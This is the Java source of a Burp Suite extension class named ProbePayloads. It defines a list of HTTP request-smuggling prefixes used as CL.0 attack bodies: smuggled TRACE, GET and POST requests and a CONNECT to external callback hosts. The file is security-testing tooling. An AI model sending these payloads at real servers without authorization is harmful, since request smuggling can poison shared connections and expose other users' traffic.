package burp;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

/**
 * Slim port of validator2's ProbePayloads: the set of smuggled-request prefixes
 * used as the CL.0 attack body (and as Phase-3 followup payloads). Canary
 * injection is applied externally via CanaryUtils, so it is NOT built in here.
 */
public class ProbePayloads {

    public static class Payload {
        private final int id;
        private final String body;
        private final boolean isDefault;
        private final boolean supports0CL;

        public Payload(int id, String body, boolean isDefault, boolean supports0CL) {
            this.id = id;
            this.body = body;
            this.isDefault = isDefault;
            this.supports0CL = supports0CL;
        }

        public Payload(int id, String body, boolean isDefault) {
            this(id, body, isDefault, true);
        }

        public int getId() { return id; }
        public String getBody() { return body; }
        public boolean isDefault() { return isDefault; }
        public boolean supports0CL() { return supports0CL; }
    }

    private static final Random random = new Random();
    private static final List<Payload> PAYLOADS = new ArrayList<>();

    static {
        PAYLOADS.add(new Payload(0, "TRACE /asdf HTTP/1.1\r\nA: B", true));
        PAYLOADS.add(new Payload(1, "X", false, false));
        PAYLOADS.add(new Payload(2, "GET / HTTP/1.1\r\nX: Y", false));
        PAYLOADS.add(new Payload(3, "GET /favicon.ico HTTP/1.1\r\nX: Y", false));
        PAYLOADS.add(new Payload(4, "GET /asdf HTTP/1.1\r\nX: Y", false));
        PAYLOADS.add(new Payload(5, "GET /0-9 HTTP/0.9\r\nX: Y", false));
        PAYLOADS.add(new Payload(6, "GET /invalid HTTP/1.2\r\nX: Y", false));
        PAYLOADS.add(new Payload(7, "TRACE / HTTP/1.1\r\nX: Y", false));
        PAYLOADS.add(new Payload(8, "GET /%2f HTTP/1.1\r\nX: Y", false));
        PAYLOADS.add(new Payload(9, "POST / HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\nContent-Length: 10\r\n\r\nx=1", false, false));
        PAYLOADS.add(new Payload(10, "GET /?rqp HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n", false, false));
        PAYLOADS.add(new Payload(11, "GET / HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\nGET / HTTP/1.1\r\nX: Y", false, false));
        PAYLOADS.add(new Payload(12, "CONNECT n1p4fbvwvalvyvljgp8a3zts4jaay5mu.psres.net:443\r\nHost: ob35pc5x5bvw8wvkqqibd03tekkb85wu.psres.net\r\n\r\n", false, false));
    }

    public static List<Payload> getAllPayloads() {
        return new ArrayList<>(PAYLOADS);
    }

    public static Payload getDefaultPayload() {
        return PAYLOADS.stream().filter(Payload::isDefault).findFirst().orElse(PAYLOADS.get(0));
    }

    public static Payload getRandomPayload() {
        return PAYLOADS.get(random.nextInt(PAYLOADS.size()));
    }
}
